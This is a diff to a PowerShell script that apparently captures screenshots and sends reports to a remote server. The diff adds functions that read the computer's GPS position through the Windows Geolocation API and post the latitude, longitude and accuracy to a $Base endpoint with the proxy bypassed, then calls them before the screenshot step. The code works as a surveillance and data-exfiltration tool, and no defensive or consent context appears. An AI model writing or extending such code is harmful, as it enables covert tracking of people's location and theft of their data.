@@ -195,6 +195,45 @@ function Get-ScreenshotB64 {
     }
 }
 
+function Get-OSLocation {
+    try {
+        Add-Type -AssemblyName System.Runtime.WindowsRuntime
+        $null = [Windows.Devices.Geolocation.Geolocator, Windows.Devices.Geolocation, ContentType = WindowsRuntime]
+        $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() |
+            Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+        $locator = New-Object Windows.Devices.Geolocation.Geolocator
+        $op = $locator.GetGeopositionAsync()
+        $asTask = $asTaskGeneric.MakeGenericMethod([Windows.Devices.Geolocation.Geoposition])
+        $netTask = $asTask.Invoke($null, @($op))
+        $null = $netTask.Wait(-1)
+        $pos = $netTask.Result
+        $lat = $pos.Coordinate.Point.Position.Latitude
+        $lon = $pos.Coordinate.Point.Position.Longitude
+        $acc = $pos.Coordinate.Accuracy
+        return @{ lat = $lat; lon = $lon; accuracy = $acc }
+    } catch {
+        return $null
+    }
+}
+
+function Send-OSLocation {
+    $loc = Get-OSLocation
+    if (-not $loc) {
+        Write-Host "[!] GPS OS tidak tersedia (pastikan Settings > Privacy > Location ON)"
+        return
+    }
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $payload = @{ lat = $loc.lat; lon = $loc.lon; accuracy = $loc.accuracy } | ConvertTo-Json -Compress
+        $resp = $wc.UploadString($Base + "/", "type=gps&data=" + [uri]::EscapeDataString($payload))
+        Write-Host "[+] GPS OS terkirim: $($loc.lat), $($loc.lon) (akurasi $($loc.accuracy) m) - $resp"
+    } catch {
+        Write-Host "[!] Gagal kirim GPS: $($_.Exception.Message)"
+    }
+}
+
 $wc = New-Object System.Net.WebClient
 $wc.Proxy = $null
 
@@ -213,6 +252,8 @@ try {
 } catch {
     Write-Host "[!] Gagal kirim laporan: $($_.Exception.Message)"
 }
+
+Send-OSLocation
 
 $shot = Get-ScreenshotB64
 if ($shot) {
